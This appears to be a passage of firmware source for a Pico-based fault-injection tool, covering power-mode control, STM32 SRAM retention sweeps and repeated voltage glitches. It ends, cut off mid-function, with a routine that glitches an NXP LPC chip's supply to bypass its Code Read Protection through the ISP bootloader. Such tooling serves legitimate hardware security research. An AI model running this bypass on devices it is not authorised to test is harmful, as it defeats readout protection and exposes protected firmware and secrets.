bool target_power_get_state(void) {
    power_ensure_init();
    return gpio_get(POWER_PIN1);
}

// ---- Power mode (internal source group vs external supply + crowbar gate) ----

power_mode_t target_get_power_mode(void) {
    return power_mode;
}

bool target_crowbar_gate_active_high(void) {
    return crowbar_gate_active_high;
}

// Drive the crowbar gate (GP11) to its safe, de-asserted idle level as a plain
// GPIO output. Used at mode switch, disarm, and boot so a wrong/floating idle
// can never clamp the rail. Polarity-aware: idle = LOW when active-high, HIGH
// when active-low. Clears any PIO outover left over from an armed window.
void target_crowbar_gate_idle(void) {
    // Stage the SIO output (de-asserted value + output-enable) while the pin is
    // still PIO-held at its idle level, then switch the function mux to SIO LAST.
    // GP11 is driven to the de-asserted level the instant SIO takes over — with
    // NO high-Z window and NO driven-assert. gpio_set_function() writes the whole
    // CTRL register, resetting OUTOVER to NORMAL atomically with the mux switch, so
    // the de-asserted value (set directly via gpio_put) needs no inversion.
    // (The old gpio_init-first order forced the pin to input first, leaving GP11
    //  briefly floating = a shallow spurious dip in active-low mode; and enabling
    //  the output before clearing the armed INVERT drove a full spurious assert.)
    gpio_put(PIN_CROWBAR_GATE, crowbar_gate_active_high ? 0 : 1);  // SIO_OUT (staged)
    gpio_set_dir(PIN_CROWBAR_GATE, GPIO_OUT);                      // SIO_OE  (staged)
    gpio_set_function(PIN_CROWBAR_GATE, GPIO_FUNC_SIO);            // mux -> SIO (resets OUTOVER -> NORMAL)
}

// Set crowbar gate polarity. Re-applies a safe idle immediately when already in
// EXTERNAL mode so the new polarity's idle level takes effect at once.
void target_set_crowbar_polarity(bool active_high) {
    crowbar_gate_active_high = active_high;
    if (power_mode == POWER_MODE_EXTERNAL) {
        target_crowbar_gate_idle();
    }
}

// Switch the GP10/11/12 group between INTERNAL (ganged power source) and
// EXTERNAL (GP10 supply enable, GP11 crowbar gate, GP12 reserved spare).
// Both directions honour the current GP10 supply on/off state (boot default is
// OFF; an explicit POWER ON / choke-point auto-power-on before the switch stays on).
void target_set_power_mode(power_mode_t mode) {
    power_ensure_init();
    bool supply_on = gpio_get(POWER_PIN1);

    if (mode == POWER_MODE_EXTERNAL) {
        // GP10 = supply enable: keep it a driven 12mA output and honour the
        // current on/off state. No gpio_init here -> no momentary low blip that
        // would briefly cut a powered target during the switch.
        gpio_set_dir(POWER_PIN1, GPIO_OUT);
        gpio_set_drive_strength(POWER_PIN1, GPIO_DRIVE_STRENGTH_12MA);
        gpio_put(POWER_PIN1, supply_on);
        // GP11 = crowbar gate at safe de-asserted idle (plain GPIO until
        // glitch_arm hands it to the crowbar pulse SM).
        target_crowbar_gate_idle();
        // GP12 = reserved spare: driven LOW (defined safe level). A bare input
        // floats/reads HIGH on RP2350 (erratum E9 input leakage), so we drive
        // it low rather than leave it high-Z.
        gpio_init(POWER_PIN3);
        gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_put(POWER_PIN3, 0);
    } else {
        // Keep GP10 a driven output (no gpio_init -> no low blip) and re-gang
        // GP11/GP12 as 12mA power outputs, all matching the honoured supply state.
        gpio_set_dir(POWER_PIN1, GPIO_OUT);
        gpio_set_drive_strength(POWER_PIN1, GPIO_DRIVE_STRENGTH_12MA);
        gpio_set_outover(PIN_CROWBAR_GATE, GPIO_OVERRIDE_NORMAL);
        const uint8_t pins[] = {POWER_PIN2, POWER_PIN3};
        for (int i = 0; i < 2; i++) {
            gpio_init(pins[i]);
            gpio_set_dir(pins[i], GPIO_OUT);
            gpio_set_drive_strength(pins[i], GPIO_DRIVE_STRENGTH_12MA);
        }
        if (supply_on) gpio_set_mask(POWER_MASK); else gpio_clr_mask(POWER_MASK);
    }
    power_mode = mode;
}

// True when a CPU-side power-group glitch routine must not run because the group
// is in EXTERNAL mode (GP11 belongs to the crowbar gate, GP12 is a spare).
// Emits a CLI error pointing at the PIO crowbar path.
static bool power_group_glitch_blocked(void) {
    if (power_mode == POWER_MODE_EXTERNAL) {
        uart_cli_send("ERROR: power-group glitch unavailable in EXTERNAL mode "
                      "(GP11 = crowbar gate). Use the PIO crowbar (ARM + trigger), "
                      "or switch back with 'TARGET POWER INT'.\r\n");
        return true;
    }
    return false;
}

// ADC configuration for voltage monitoring
#define ADC_POWER_PIN   26  // GP26 = ADC0, connected to target VDD
#define ADC_POWER_CHAN  0

// SRAM test pattern
#define SRAM_TEST_WORDS 256
#define SRAM_TEST_PATTERN 0xDEAD0000u

// Sweep-derived glitch parameters (set by TARGET GLITCH SWEEP)
// Optimal threshold: highest sweep threshold where BOR triggered AND SRAM survived
static float sweep_optimal_thresh = 0;
static bool sweep_calibrated = false;

static void adc_power_init(void) {
    adc_init();
    adc_gpio_init(ADC_POWER_PIN);
    adc_select_input(ADC_POWER_CHAN);
}

// GPIO interrupt latch for nRST — catches pulses too brief for polling
static volatile bool nrst_irq_fired;
static volatile uint64_t nrst_irq_time;

static void nrst_irq_handler(uint gpio, uint32_t events) {
    (void)gpio;
    (void)events;
    if (!nrst_irq_fired) {
        nrst_irq_fired = true;
        nrst_irq_time = time_us_64();
    }
}

static void nrst_irq_arm(void) {
    nrst_irq_fired = false;
    nrst_irq_time = 0;
    // Use direct callback — shared dispatcher introduces timing issues
    // that cause ADC polling loop to miss the power restore window
    gpio_set_irq_enabled_with_callback(reset_pin, GPIO_IRQ_EDGE_FALL, true, nrst_irq_handler);
}

static void nrst_irq_disarm(void) {
    gpio_set_irq_enabled(reset_pin, GPIO_IRQ_EDGE_FALL, false);
}

// Result of a single power glitch
typedef struct {
    uint32_t glitch_us;
    uint16_t vmin_raw;
    bool thresh_reached;
    bool nrst_went_low;
    uint32_t nrst_low_us;
    uint16_t bor_adc;
} glitch_result_t;

// Execute a single power glitch: drive power low, ADC-gate to threshold,
// optionally dwell past threshold for min_width_us, restore, monitor nRST.
// If min_width_us > 0 the rail is held LOW for at least that long even
// after the ADC reads <= thresh (lets the core caps actually discharge).
static void power_glitch_once(uint32_t thresh, uint32_t min_width_us,
                              uint16_t *adc_log,
                              uint32_t adc_log_size, uint32_t *adc_log_count_out,
                              glitch_result_t *result) {
    result->thresh_reached = true;
    result->nrst_went_low = false;
    result->nrst_low_us = 0;
    result->bor_adc = 0;
    result->vmin_raw = 4095;

    // Arm nRST interrupt to catch brief BOR pulses
    nrst_irq_arm();

    // Float POWER2/3 so only POWER1 sinks (controlled discharge)
    gpio_set_dir(POWER_PIN2, GPIO_IN);
    gpio_set_dir(POWER_PIN3, GPIO_IN);
    gpio_disable_pulls(POWER_PIN2);
    gpio_disable_pulls(POWER_PIN3);

    // Select ADC channel (adc_power_init() already called once by caller)
    adc_select_input(ADC_POWER_CHAN);

    uint32_t adc_log_count = 0;

    // Drive single power pin low
    uint64_t t0 = time_us_64();
    gpio_clr_mask(1u << POWER_PIN1);

    // Poll ADC until voltage drops below threshold
    while (true) {
        uint16_t val = adc_read();
        if (adc_log_count < adc_log_size)
            adc_log[adc_log_count++] = val;
        if (val < result->vmin_raw)
            result->vmin_raw = val;
        if (val <= thresh)
            break;
        if (time_us_64() - t0 > 500000) {
            result->thresh_reached = false;
            break;
        }
    }

    // Optional dwell: keep rail LOW past threshold so core decoupling caps
    // also drain. ADC keeps sampling so vmin_raw stays accurate.
    if (min_width_us > 0 && result->thresh_reached) {
        uint64_t dwell_end = t0 + min_width_us;
        while (time_us_64() < dwell_end) {
            uint16_t val = adc_read();
            if (adc_log_count < adc_log_size)
                adc_log[adc_log_count++] = val;
            if (val < result->vmin_raw)
                result->vmin_raw = val;
        }
    }

    // Restore power: all pins back to output HIGH
    gpio_set_dir(POWER_PIN2, GPIO_OUT);
    gpio_set_dir(POWER_PIN3, GPIO_OUT);
    gpio_set_mask(POWER_MASK);
    result->glitch_us = (uint32_t)(time_us_64() - t0);

    // Monitor nRST for 50ms (polling + IRQ backup)
    for (int i = 0; i < 5000; i++) {
        if (!gpio_get(reset_pin) && !result->nrst_went_low) {
            result->nrst_low_us = (uint32_t)(time_us_64() - t0);
            result->bor_adc = adc_read();
            result->nrst_went_low = true;
        }
        sleep_us(10);
    }

    // Check IRQ latch if polling missed it
    nrst_irq_disarm();
    if (!result->nrst_went_low && nrst_irq_fired) {
        result->nrst_went_low = true;
        result->nrst_low_us = (uint32_t)(nrst_irq_time - t0);
        if (adc_log_count > 0 && result->glitch_us > 0) {
            uint32_t idx = (uint32_t)((uint64_t)result->nrst_low_us * adc_log_count / result->glitch_us);
            if (idx >= adc_log_count) idx = adc_log_count - 1;
            result->bor_adc = adc_log[idx];
        }
    }

    *adc_log_count_out = adc_log_count;
}

static float adc_read_voltage(void) {
    adc_select_input(ADC_POWER_CHAN);
    uint16_t raw = adc_read();
    return raw * 3.3f / 4095.0f;
}

// Auto-detect target via SWD if not already set. Returns target info or NULL.
static const stm32_target_info_t *ensure_target_type(void) {
    extern bool swd_ensure_connected(void);
    extern bool swd_clear_errors(void);
    extern bool swd_detect(uint32_t *cpuid_out, uint32_t *dbg_idcode_out);
    extern void swd_deinit(void);

    const stm32_target_info_t *info = stm32_get_target_info(current_target_type);
    if (info)
        return info;

    // Not set — auto-detect the same robust way `SWD IDCODE` does: energise the
    // target (power-off is the boot default), ensure the SWD link is up, and
    // clear any sticky errors a prior glitch left behind, THEN read the DEV_ID.
    // The old bare swd_connect() path skipped the power-on + error-clear and
    // faulted (ACK=0x7) whenever a preceding glitch left the target mid-boot.
    uart_cli_send("No target set, attempting SWD auto-detect...\r\n");
    target_power_ensure_on();
    if (!swd_ensure_connected()) {
        uart_cli_send("ERROR: SWD connect failed. Set target with TARGET or SWD IDCODE\r\n");
        return NULL;
    }
    swd_clear_errors();

    uint32_t cpuid, dbg_id;
    if (!swd_detect(&cpuid, &dbg_id)) {
        swd_deinit();
        uart_cli_send("ERROR: Could not read debug registers. Set target manually\r\n");
        return NULL;
    }
    swd_deinit();

    uint16_t dev_id = dbg_id & 0xFFF;
    target_type_t auto_tt = TARGET_NONE;
    switch (dev_id) {
        case 0x410: case 0x412: case 0x414: case 0x430:
            auto_tt = TARGET_STM32F1; break;
        case 0x438:
            auto_tt = TARGET_STM32F3; break;
        case 0x413: case 0x419: case 0x421: case 0x423: case 0x433:
            auto_tt = TARGET_STM32F4; break;
        case 0x415: case 0x435: case 0x462: case 0x464: case 0x461:
            auto_tt = TARGET_STM32L4; break;
    }
    if (auto_tt == TARGET_NONE) {
        uart_cli_printf("ERROR: Unknown DEV_ID 0x%03X. Set target manually\r\n", dev_id);
        return NULL;
    }

    target_set_type(auto_tt);
    info = stm32_get_target_info(auto_tt);
    uart_cli_printf("Auto-detected: %s (DEV_ID 0x%03X)\r\n", info->name, dev_id);
    return info;
}

static int sram_test_write_pattern(uint32_t sram_base) {
    uint32_t pattern[SRAM_TEST_WORDS];
    for (int i = 0; i < SRAM_TEST_WORDS; i++)
        pattern[i] = SRAM_TEST_PATTERN | (uint32_t)i;

    // Write pattern
    uint32_t written = swd_write_mem(sram_base, pattern, SRAM_TEST_WORDS);
    if (written != SRAM_TEST_WORDS) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%d words)\r\n", written, SRAM_TEST_WORDS);
        return -1;
    }

    // Verify write
    uint32_t readback[SRAM_TEST_WORDS];
    uint32_t read = swd_read_mem(sram_base, readback, SRAM_TEST_WORDS);
    if (read != SRAM_TEST_WORDS) {
        uart_cli_send("ERROR: SRAM verify read failed\r\n");
        return -1;
    }

    int bad = 0;
    for (int i = 0; i < SRAM_TEST_WORDS; i++) {
        if (readback[i] != pattern[i]) bad++;
    }
    if (bad) {
        uart_cli_printf("ERROR: SRAM verify failed: %d/%d words bad\r\n", bad, SRAM_TEST_WORDS);
        return -1;
    }

    return 0;
}

static int sram_test_read_pattern(uint32_t sram_base) {
    uint32_t readback[SRAM_TEST_WORDS];
    uint32_t read = swd_read_mem(sram_base, readback, SRAM_TEST_WORDS);
    if (read != SRAM_TEST_WORDS)
        return -1;

    int good = 0;
    for (int i = 0; i < SRAM_TEST_WORDS; i++) {
        uint32_t expected = SRAM_TEST_PATTERN | (uint32_t)i;
        if (readback[i] == expected) good++;
    }
    return good;
}

/*
 * SRAM retention sweep — ADC-threshold version (from stimpik).
 *
 * For each step:
 *   1. Write test pattern to SRAM via SWD
 *   2. Float SWD pins, set NRST as input
 *   3. Drop power (clear all power GPIOs)
 *   4. Poll ADC in tight loop until voltage drops to threshold
 *   5. Immediately restore all power GPIOs
 *   6. Monitor NRST for BOR detection
 *   7. Re-attach SWD, read back SRAM, count retained words
 *
 * Sweep threshold from ~2.5V down in ~0.08V steps.
 * High threshold = shallow dip (SRAM survives).
 * Low threshold = deep dip (eventually corrupts SRAM or triggers BOR).
 */
// SRAM retention sweep — based on stimpik by Sean Cross (xobs)
// https://github.com/xobs/stimpik
void target_power_sweep(void) {
    if (power_group_glitch_blocked()) return;
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern void swd_init(void);
    extern void swd_deinit(void);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uart_cli_printf("SRAM retention sweep on %s (SRAM @ 0x%08lX)\r\n", info->name, sram_base);
    uart_cli_send("Sweep: drop power, poll ADC to threshold, restore, check SRAM\r\n");

    adc_power_init();
    power_ensure_init();

    #define SWEEP_MAX 128
    #define ADC_LOG_SIZE 256

    static struct {
        uint32_t thresh;
        uint16_t vmin_raw;
        int16_t good;           // -1 = read failed
        uint32_t glitch_us;
        bool nrst;
        uint16_t bor_adc;
    } results[SWEEP_MAX];
    uint32_t result_count = 0;

    static uint16_t adc_log[ADC_LOG_SIZE];

    /* Sweep from ~2.5V down; switch to fine steps after first BOR */
    uint32_t step = 100;  // ~0.08V coarse steps
    bool seen_nrst = false;
    uint32_t nrst_count = 0;
    for (uint32_t thresh = 3103; thresh >= step; thresh -= step) {
        uart_cli_printf("\r\n--- Threshold: %lu (%.2fV) ---\r\n",
                        thresh, thresh * 3.3f / 4095.0f);

        // Connect, halt, write pattern — retry once after power cycle
        swd_init();
        bool setup_ok = false;
        for (int attempt = 0; attempt < 2; attempt++) {
            if (!swd_connect()) {
                if (attempt == 0) {
                    uart_cli_send("SWD connect failed, power cycling...\r\n");
                    swd_deinit();
                    gpio_clr_mask(POWER_MASK);
                    sleep_ms(200);
                    gpio_set_mask(POWER_MASK);
                    sleep_ms(200);
                    swd_init();
                    continue;
                }
                uart_cli_send("ERROR: SWD connect failed after retry\r\n");
                break;
            }
            if (!swd_halt() || sram_test_write_pattern(sram_base) != 0) {
                if (attempt == 0) {
                    uart_cli_send("Write failed, power cycling...\r\n");
                    swd_deinit();
                    gpio_clr_mask(POWER_MASK);
                    sleep_ms(200);
                    gpio_set_mask(POWER_MASK);
                    sleep_ms(200);
                    swd_init();
                    continue;
                }
                uart_cli_send("ERROR: Write failed after retry\r\n");
                break;
            }
            setup_ok = true;
            break;
        }
        if (!setup_ok) {
            swd_deinit();
            break;
        }

        // Float SWD pins before glitch
        swd_deinit();

        // Ensure NRST is input with pull-up
        gpio_init(reset_pin);
        gpio_set_dir(reset_pin, GPIO_IN);
        gpio_pull_up(reset_pin);

        uint32_t adc_log_count = 0;
        glitch_result_t gr;
        power_glitch_once(thresh, 0, adc_log, ADC_LOG_SIZE, &adc_log_count, &gr);

        // Report glitch stats
        if (!gr.thresh_reached) {
            uart_cli_printf("Timeout: Vmin=%.2fV (can't reach %.2fV), NRST: %s\r\n",
                            gr.vmin_raw * 3.3f / 4095.0f,
                            thresh * 3.3f / 4095.0f,
                            gr.nrst_went_low ? "TRIGGERED" : "no reset");
        } else {
            uart_cli_printf("Glitch: %luus, Vmin=%.2fV, NRST: %s",
                            gr.glitch_us,
                            gr.vmin_raw * 3.3f / 4095.0f,
                            gr.nrst_went_low ? "TRIGGERED" : "no reset");
            if (gr.nrst_went_low)
                uart_cli_printf(" (after %luus, BOR@%.2fV)",
                                gr.nrst_low_us, gr.bor_adc * 3.3f / 4095.0f);
            uart_cli_send("\r\n");
        }

        // Wait for target to stabilize
        sleep_ms(50);

        // Re-attach via SWD and read back
        swd_init();
        int good = -1;
        if (swd_connect()) {
            if (swd_halt())
                good = sram_test_read_pattern(sram_base);
        }
        swd_deinit();

        if (good < 0) {
            uart_cli_send("Read failed — power cycling target\r\n");
            // Full power cycle to recover target
            gpio_clr_mask(POWER_MASK);
            sleep_ms(200);
            gpio_set_mask(POWER_MASK);
            sleep_ms(200);
        } else {
            uart_cli_printf("Result: %d/%d words retained at %.2fV threshold\r\n",
                            good, SRAM_TEST_WORDS, thresh * 3.3f / 4095.0f);
        }

        // Record result
        if (result_count < SWEEP_MAX) {
            results[result_count].thresh = thresh;
            results[result_count].vmin_raw = gr.vmin_raw;
            results[result_count].good = (int16_t)good;
            results[result_count].glitch_us = gr.glitch_us;
            results[result_count].nrst = gr.nrst_went_low;
            results[result_count].bor_adc = gr.bor_adc;
            result_count++;
        }

        // After first SRAM corruption, switch to fine steps (~8mV)
        if (good >= 0 && good < SRAM_TEST_WORDS && !seen_nrst) {
            seen_nrst = true;
            step = 10;
            uart_cli_printf("  (Corruption detected, switching to fine steps: ~%.0fmV)\r\n",
                            step * 3300.0f / 4095.0f);
            nrst_count++;
        } else if (good >= 0 && good < SRAM_TEST_WORDS) {
            nrst_count++;
            if (nrst_count >= 8) {
                uart_cli_send("*** 8 corruption events, stopping sweep ***\r\n");
                break;
            }
        }

        // Stop if threshold not reached
        if (!gr.thresh_reached) {
            uart_cli_printf("*** Voltage floor reached at %.2fV, stopping sweep ***\r\n",
                            gr.vmin_raw * 3.3f / 4095.0f);
            break;
        }
        sleep_ms(200);  // Let target fully recover
    }

    // Print summary table
    uart_cli_send("\r\n=== SRAM Retention Sweep Summary ===\r\n");
    uart_cli_send("Thresh(V)  Vmin(V)  Glitch(us)  NRST  BOR(V)  Retained\r\n");
    uart_cli_send("---------  ------   ----------  ----  ------  --------\r\n");
    for (uint32_t i = 0; i < result_count; i++) {
        uart_cli_printf("  %.2fV     %.2fV    %5lu       %s   ",
                        results[i].thresh * 3.3f / 4095.0f,
                        results[i].vmin_raw * 3.3f / 4095.0f,
                        results[i].glitch_us,
                        results[i].nrst ? "Y" : "N");
        if (results[i].nrst)
            uart_cli_printf("%.2fV  ", results[i].bor_adc * 3.3f / 4095.0f);
        else
            uart_cli_send("  --   ");
        if (results[i].good < 0)
            uart_cli_send("FAIL\r\n");
        else
            uart_cli_printf("%d/%d\r\n", results[i].good, SRAM_TEST_WORDS);
    }

    // Report BOR threshold if detected
    float bor_lo = 0, bor_hi = 0;
    for (uint32_t i = 0; i < result_count; i++) {
        if (results[i].nrst) {
            bor_lo = results[i].bor_adc * 3.3f / 4095.0f;
            if (i > 0)
                bor_hi = results[i - 1].vmin_raw * 3.3f / 4095.0f;
            break;
        }
    }
    if (bor_lo > 0) {
        uart_cli_printf("\r\nBOR threshold: ~%.2fV", bor_lo);
        if (bor_hi > 0)
            uart_cli_printf(" (last no-reset Vmin: %.2fV)", bor_hi);
        uart_cli_send("\r\n");
    } else {
        uart_cli_send("\r\nBOR not triggered during sweep\r\n");
    }

    // Derive optimal glitch threshold from sweep results
    // Viable range = thresholds where BOR triggered AND SRAM fully survived.
    // Lowest viable is the most aggressive (closest to SRAM corruption);
    // highest viable barely trips BOR. Pick the midpoint for reliability.
    {
        float vmin = 0, vmax = 0;
        for (uint32_t i = 0; i < result_count; i++) {
            if (results[i].nrst && results[i].good == SRAM_TEST_WORDS) {
                float v = results[i].thresh * 3.3f / 4095.0f;
                if (vmin == 0 || v < vmin) vmin = v;
                if (v > vmax) vmax = v;
            }
        }
        if (vmin > 0) {
            sweep_optimal_thresh = (vmin + vmax) / 2.0f;
            sweep_calibrated = true;
            uart_cli_printf("\r\nCalibration saved: optimal threshold=%.2fV (midpoint of %.2f-%.2fV viable range)\r\n",
                            sweep_optimal_thresh, vmin, vmax);
        }
    }

    // Ensure power is restored and reset pin back to normal
    gpio_set_mask(POWER_MASK);
    // Reset pin back to high-Z inactive — target's pull on nRST owns the
    // line so we don't leak onto JTAG TREF or other shared nets.
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_disable_pulls(reset_pin);

    uart_cli_send("Sweep complete, power restored\r\n");
}

// Repeated power glitch at a fixed threshold — reports success rate
void target_power_glitch(float voltage, uint32_t count) {
    if (power_group_glitch_blocked()) return;
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern void swd_init(void);
    extern void swd_deinit(void);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t thresh = (uint32_t)(voltage * 4095.0f / 3.3f);
    if (thresh > 4095) thresh = 4095;

    uart_cli_printf("Power glitch: %.2fV threshold (ADC %lu), %lu iterations on %s\r\n",
                    voltage, thresh, count, info->name);

    adc_power_init();
    power_ensure_init();

    uint32_t total_retained = 0;
    uint32_t total_nrst = 0;
    uint32_t total_both = 0;  // retained AND nRST
    uint32_t total_fail = 0;
    uint32_t total_timeout = 0;
    uint32_t glitch_us_sum = 0;

    #define GLITCH_ADC_LOG 256
    uint16_t adc_log[GLITCH_ADC_LOG];

    for (uint32_t iter = 0; iter < count; iter++) {
        // Connect, halt, write pattern
        swd_init();
        if (!swd_connect()) {
            uart_cli_printf("[%lu/%lu] SWD connect failed\r\n", iter + 1, count);
            swd_deinit();
            total_fail++;
            sleep_ms(200);
            continue;
        }
        swd_halt();
        if (sram_test_write_pattern(sram_base) != 0) {
            uart_cli_printf("[%lu/%lu] SRAM write failed\r\n", iter + 1, count);
            swd_deinit();
            total_fail++;
            sleep_ms(200);
            continue;
        }

        // Float SWD pins before glitch
        swd_deinit();

        // nRST as input with pull-up
        gpio_init(reset_pin);
        gpio_set_dir(reset_pin, GPIO_IN);
        gpio_pull_up(reset_pin);

        uint32_t adc_log_count = 0;
        glitch_result_t gr;
        power_glitch_once(thresh, 0, adc_log, GLITCH_ADC_LOG, &adc_log_count, &gr);

        if (!gr.thresh_reached) {
            total_timeout++;
            uart_cli_printf("[%lu/%lu] Timeout\r\n", iter + 1, count);
            sleep_ms(200);
            continue;
        }

        glitch_us_sum += gr.glitch_us;

        // Wait for target to stabilize, then read back SRAM
        sleep_ms(50);
        swd_init();
        int good = -1;
        if (swd_connect()) {
            swd_halt();
            good = sram_test_read_pattern(sram_base);
        }
        swd_deinit();

        bool retained = (good == SRAM_TEST_WORDS);
        if (retained) total_retained++;
        if (gr.nrst_went_low) total_nrst++;
        if (retained && gr.nrst_went_low) total_both++;
        if (good < 0) total_fail++;

        uart_cli_printf("[%lu/%lu] %luus Vmin=%.2fV NRST:%s SRAM:%s\r\n",
                        iter + 1, count, gr.glitch_us,
                        gr.vmin_raw * 3.3f / 4095.0f,
                        gr.nrst_went_low ? "Y" : "N",
                        good < 0 ? "FAIL" : (retained ? "OK" : "CORRUPT"));

        sleep_ms(200);
    }

    // Summary
    uint32_t valid = count - total_timeout - total_fail;
    uart_cli_send("\r\n=== Power Glitch Summary ===\r\n");
    uart_cli_printf("Threshold: %.2fV, Iterations: %lu\r\n", voltage, count);
    if (valid > 0)
        uart_cli_printf("Avg glitch: %luus\r\n", glitch_us_sum / valid);
    uart_cli_printf("SRAM retained: %lu/%lu (%lu%%)\r\n",
                    total_retained, count,
                    count > 0 ? total_retained * 100 / count : 0);
    uart_cli_printf("nRST fired:    %lu/%lu (%lu%%)\r\n",
                    total_nrst, count,
                    count > 0 ? total_nrst * 100 / count : 0);
    uart_cli_printf("Both (window): %lu/%lu (%lu%%)\r\n",
                    total_both, count,
                    count > 0 ? total_both * 100 / count : 0);
    if (total_fail > 0)
        uart_cli_printf("SWD failures:  %lu\r\n", total_fail);
    if (total_timeout > 0)
        uart_cli_printf("Timeouts:      %lu\r\n", total_timeout);

    // Restore
    gpio_set_mask(POWER_MASK);
    // Reset pin back to high-Z inactive — target's pull on nRST owns the
    // line so we don't leak onto JTAG TREF or other shared nets.
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_disable_pulls(reset_pin);

    uart_cli_send("Glitch test complete, power restored\r\n");
}

// ----------------------------------------------------------------------------
// LPC CRP-bypass via ADC-controlled VDD glitch (mirrors target_power_glitch
// but uses ISP-side verification — no SWD/SRAM access on a CRP-locked LPC).
//
// Each attempt:
//   1. power_glitch_once() drops VDD until ADC hits threshold, then restores
//   2. wait for the chip to re-enter ISP
//   3. target_enter_bootloader() — re-sync over UART1
//   4. send "R 0 4\r\n" to LPC, parse the return code line
//   5. classify:
//        rc=0  → BYPASS (CRP defeated, ISP read succeeded)
//        rc=19 → normal (CRP held)
//        sync failed → effect (target left in weird state)
//        no rc at all → effect (timeout)
//
// Prints one parseable line per attempt:
//   [LPC GLITCH] attempt=N vmin=X.XXV bor=Y/N dur=Nus isp=normal|bypass|effect|sync_fail
// ----------------------------------------------------------------------------
void target_power_lpc_glitch(uint32_t count) {
    if (power_group_glitch_blocked()) return;
    // ---- guardrails ----
    // After the v1 of this function bricked a Pico (likely via cap-discharge
    // inrush through GP10/11/12 during repeated full-drop glitches), reject
    // inputs that would either be no-ops or would stress the GPIO too hard.

    // Glitch depth (VMIN, mV) and min-dwell (WIDTH cycles, converted to us)
    // come from the unified glitch config — same knobs as a manual glitch.
    glitch_config_t *gcfg = glitch_get_config();
    if (gcfg->vmin_mv == 0) {
        uart_cli_send("ERROR: VMIN is disabled. SET VMIN <mV> first.\r\n");
        return;
    }
    float voltage = gcfg->vmin_mv / 1000.0f;
    uint32_t dwell_us = gcfg->width_cycles / 150;

    // NOTE: deliberately skip adc_power_init() / adc_gpio_init() / gpio_init.
    // - adc_gpio_init() on RP2350 latches GP26 HIGH (confirmed bench bug).
    // - gpio_init(26) sets SIO+input which RE-ENABLES the schmitt buffer,
    //   loading the high-impedance probe and producing floating noisy
    //   readings.
    // The ADC CLI command works correctly by just calling adc_init() +
    // adc_select_input() — the analog mux samples the pin regardless of
    // digital pin function. Mirror that here.
    adc_init();
    adc_select_input(0);              // GP26 = ADC0 analog mux
    power_ensure_init();

    // Make sure power is on and let it stabilize before measuring idle.
    gpio_set_mask(POWER_MASK);
    sleep_ms(50);

    // Average a small batch of ADC samples for a stable idle reading.
    uint32_t sum = 0;
    for (int i = 0; i < 16; i++) {
        sum += adc_read();
        sleep_us(100);
    }
    uint16_t idle_raw = (uint16_t)(sum / 16);
    float idle_v = idle_raw * 3.3f / 4095.0f;
    uart_cli_printf("Idle target VDD: %.3fV (ADC %u)\r\n", idle_v, idle_raw);

    // Sanity 1: confirm we see *something* on GP26. If the probe is loose
    // or target power is off we'd read ~0V and any sweep would never trigger
    // power_glitch_once's threshold-reached path → infinite poll.
    if (idle_raw < (uint16_t)(0.3f * 4095.0f / 3.3f)) {
        uart_cli_printf("ERROR: idle %.2fV is too low. Confirm GP26 is on target VDD\r\n"
                        "       (or a divider thereof) and target power is on. Refusing.\r\n",
                        idle_v);
        return;
    }

    // Sanity 2: requested VMIN must be meaningfully below idle. ≥ idle is
    // a no-op; within 100 mV of idle is too shallow to be useful. Note:
    // both numbers are in PROBE space — if there's a divider between the
    // chip rail and GP26, scale VMIN accordingly.
    if (voltage >= idle_v - 0.1f) {
        uart_cli_printf("ERROR: VMIN %.2fV is not below idle %.2fV by at least 0.1V.\r\n"
                        "       SET VMIN to a lower value. Refusing.\r\n",
                        voltage, idle_v);
        return;
    }

    // Sanity 3: cap count to keep a single CLI invocation bounded. Repeated
    // brownouts in a tight loop are the most common way to brick the Pico
    // (a la the v1 incident); keep ≤ 100 per call.
    if (count == 0) count = 1;
    if (count > 100) {
        uart_cli_printf("Clamping count %lu → 100 (safety cap)\r\n", count);
        count = 100;
    }

    uint32_t thresh = (uint32_t)(voltage * 4095.0f / 3.3f);
    if (thresh > 4095) thresh = 4095;

    uart_cli_printf("LPC CRP-bypass voltage glitch: VMIN=%.3fV (ADC %lu), %lu attempts, dwell=%luus\r\n",
                    voltage, thresh, count, dwell_us);

    uint32_t bypass = 0, normal_cnt = 0, effect_cnt = 0, sync_fail = 0;

    for (uint32_t iter = 0; iter < count; iter++) {
        // 1. ADC-controlled drop + dwell + restore.
        glitch_result_t gr;
        power_glitch_once(thresh, dwell_us, NULL, 0, NULL, &gr);
        float vmin_v = gr.vmin_raw * 3.3f / 4095.0f;

        // 2. Wait for chip to settle and start the boot ROM / ISP path.
        sleep_ms(200);

        // 3. Re-sync over UART1. target_enter_bootloader handles the
        //    LPC ISP "?" + Synchronized + crystal kHz + A 1 sequence.
        if (!target_enter_bootloader(115200, 12000)) {
            sync_fail++;
            uart_cli_printf("[LPC GLITCH] attempt=%lu vmin=%.2fV bor=%s dur=%luus isp=sync_fail\r\n",
                            iter + 1, vmin_v,
                            gr.nrst_went_low ? "Y" : "N",
                            gr.glitch_us);
            continue;
        }

        // 4. Send R 0 4 to the LPC and read its return code.
        //    Format: command + \r\n. LPC echoes (because A 1 was set) then sends
        //    rc on its own line, then data lines if rc=0.
        const char *cmd = "R 0 4\r\n";
        for (const char *p = cmd; *p; p++)
            uart_putc_raw(TARGET_UART_ID, *p);
        uart_tx_wait_blocking(TARGET_UART_ID);

        // Read up to 4 lines (echo + rc + possibly data) into a buffer to scan.
        char buf[128];
        size_t pos = 0;
        uint64_t deadline = time_us_64() + 1500000;
        bool saw_lf = false;
        int lf_count = 0;
        while (pos < sizeof(buf) - 1 && time_us_64() < deadline) {
            if (uart_is_readable(TARGET_UART_ID)) {
                char c = (char)uart_getc(TARGET_UART_ID);
                buf[pos++] = c;
                if (c == '\n') {
                    saw_lf = true;
                    if (++lf_count >= 3) break;  // echo + rc + maybe one more
                }
            }
        }
        buf[pos] = '\0';

        // 5. Find the rc line (first numeric token after the echo).
        const char *result = "effect";
        // Skip the echo (find first \n)
        const char *rc_line = NULL;
